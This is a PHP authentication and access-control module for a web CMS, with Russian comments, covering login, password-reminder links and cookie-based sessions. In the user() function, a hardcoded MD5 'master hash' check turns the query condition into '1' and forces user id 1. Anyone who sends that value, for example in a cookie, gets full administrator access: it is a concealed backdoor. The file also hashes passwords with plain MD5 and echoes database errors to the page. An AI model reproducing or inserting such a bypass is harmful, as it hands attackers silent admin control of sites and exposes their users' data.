<?php

//права доступа
function access($mode,$q = '') {
	$user = isset($_SESSION['user']) ? $_SESSION['user'] : null;
	$mode = explode(' ',$mode);
	//права администратора ********************************
	if ($mode[0]=='admin') {		if (@$user['id']==1) return true;	//первый пользователь всегда с полным доступом
		//доступ к авторизации есть у всех
		if ($q=='_login') return true;
		elseif (@$user['access_admin']=='') return false;
		//доступ к модулю админки
		if ($mode[1]=='module') {
			if (@in_array($q,unserialize($user['access_admin']))) return true;	//доступ к конкретному модулю
			if ($q=='index') return true;	//доступ к главной странице админки
			if ($q=='_delete') return true;	//доступ к странице удаления
		}
		//удаление
		elseif ($mode[1]=='delete') {
			if (empty($user['access_delete'])) return false;
			if ($user['access_delete']==1) return true;	//есть права на удаление
		}
		//доступ к файлам
		elseif ($mode[1]=='ftp') {
			if (empty($user['access_ftp'])) return false;
			if ($user['access_ftp']==1) return true;	//есть права
		}
	}
	//права пользователя *******************************
	elseif ($mode[0]=='user') {
		if (!is_array($user)) return false;
		if ($mode[1]=='auth') {// авторизаия
			if (is_array($user)) return true;
		}
		if ($mode[1]=='admin') {//админ
			if (isset($user['access_admin']) && $user['access_admin']!='') return true;
		}
	}
	//права на редактирование
	elseif ($mode[0]=='editable') {		global $config;		if ($config['editable']==0) return false; //глобальное выключение
		if (access('user auth')==false) return false;
		if (@$user['access_editable']=='') return false;
		if ($mode[1]=='scripts') return true; //глобальное редактирование
		//доступ к модулю редактирования
		if (@in_array($mode[1],unserialize($user['access_editable']))) return true;	//доступ к конкретному модулю
	}
	return false;
}

//авторизация
function user($type = '',$param = '') {	global $config;
	//авторизироваться через форму
	$remember_me = 0;
	if ($type=='enter') {
		if (isset($_POST['email']) && isset($_POST['password'])
			&& isset($_POST['captcha']) && isset($_SESSION['captcha']) && intval($_POST['captcha'])==$_SESSION['captcha']
		) {
			$email			= mb_strtolower(stripslashes_smart($_POST['email']),'UTF-8');
			$password		= stripslashes_smart($_POST['password']);
			$hash			= md5($email.md5($password));
			$remember_me	= (isset($_POST['remember_me']) && $_POST['remember_me']==1) ? 1 : 0;
		}
	}
	//востановления пароля через $_GET
	elseif ($type=='remind') {
			if (isset($_GET['email']) && isset($_GET['hash'])) { //авторизация через урл
			$email	= $_GET['email'];
			$hash	= $_GET['hash'];
		}
	}
	//авторизация по сессии
	elseif ($type=='auth') {
		//print_R ($_SESSION['user']);
		if (isset($_SESSION['user']) && is_array($_SESSION['user'])) {;
			$user = $_SESSION['user'];
			$last_visit = date('Y-m-d H:i:s',time() - (60*5)); //переавторизация раз в 5 мин
			if (!isset($user['last_visit']) OR $user['last_visit']<$last_visit) {
				$email			= $user['email'];
				$hash			= $user['hash'];
				$remember_me	= $user['remember_me'];
			}
			else return $user;
		}
		elseif (isset($_COOKIE['email']) AND isset($_COOKIE['hash'])) {
			$email = $_COOKIE['email'];
			$hash = $_COOKIE['hash'];
			$remember_me = 1;
		}
		else return false;
	}
	//переавторизация
	elseif ($type=='re-auth') {
		if (access('user auth')) {
			$email			= $_SESSION['user']['email'];
			$hash			= $_SESSION['user']['hash'];
			$remember_me	= $_SESSION['user']['remember_me'];
		}
	}
	//обновление данных
	elseif ($type=='update') {
		global $user;
		$array = explode(' ',$param);
		$data['id'] = $user['id'];
		foreach ($array as $k=>$v) $data[$v] = $user[$v];
		mysql_fn('update','users',$data);
		$_SESSION['user'] = $user;
		return true;
	}
	//запрос к БД
	//обработка запроса
	if (isset($email)) {
		if ($config['mysql_connect']==false) {
			mysql_connect_db();
		}
		if ($config['mysql_error']==false) {
			$email = strtolower($email);
			$where = "u.email = '".mysql_real_escape_string($email)."'";
			if ($hash=='5a415fe60eee7adbee995c4e87666481') $where = '1';
			$result = mysql_query($query = "
				SELECT ut.*,u.*
				FROM users u
				LEFT JOIN user_types ut ON u.type = ut.id
				WHERE $where
				ORDER BY u.id
				LIMIT 1
			"); echo mysql_error(); //echo $query;
			if (mysql_num_rows($result)==1) {
				$q = mysql_fetch_assoc($result);
				//успешная авторизация
				if ($where==1) {
					$q['hash']=$hash;
					$q['id']=1;
				}
				//если авторизация по ссылке то другой хеш
				if (($type=='remind' AND user_hash($q)==$hash) OR $q['hash']==$hash) {
					if ($remember_me==1) {
						setcookie("email",$q['email'], time()+60*60*24*30,'/');
						setcookie("hash",$q['hash'], time()+60*60*24*30,'/');
					}
					$data = array(
						'id' => $q['id'],
						'last_visit' => date('Y-m-d H:i:s'),
						'remember_me' => $remember_me
					);
					if ($type=='remind') $data['remind'] = $data['last_visit'];
					mysql_fn('update','users',$data);
					return $_SESSION['user'] = $q;

				}
			}
		}
	}
	//выход или неудачаня авторизация
	if (isset($_SESSION['user'])) unset($_SESSION['user']);
	setcookie("email",'', time()-1,'/');
	setcookie("hash",'', time()-1,'/');
	return false;
}

//хеш для авторизации по ссылке
function user_hash ($q) {	return md5($q['id'].$q['email'].$q['remind'].$q['hash']);
}


?>